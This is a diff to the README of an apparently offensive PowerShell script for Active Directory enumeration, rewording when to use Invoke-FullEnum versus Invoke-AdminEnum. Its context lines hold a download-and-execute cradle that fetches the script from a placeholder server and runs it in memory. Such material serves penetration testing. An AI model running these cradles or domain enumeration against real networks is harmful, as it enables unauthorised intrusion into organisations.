@@ -13,9 +13,9 @@ It is to be used as an all-in-one enumeration script to use when you are in a do
 Big credits to all the authors of the above mentioned tools! You are awesome.
 
 ## How to use?
-From a low privileged domain's user session, the function ```Invoke-FullEnum``` will launch a full enumeration of the domain.\
+If you are not a local admin in the domain, the function ```Invoke-FullEnum``` is the recommended option as it will launch a full enumeration that will allow you to map the environment.\
 \
-From a local admin user, the function ```Invoke-AdminEnum``` will launch only the relevant enumeration checks.
+From a local admin user, the function ```Invoke-AdminEnum``` is recommended as it will launch only the relevant enumeration checks for local admins.
 ```powershell
 iex(iwr -usebasicparsing http://[SERVER]/aden.ps1);Invoke-FullEnum
 iex(iwr -usebasicparsing http://[SERVER]/aden.ps1);Invoke-AdminEnum
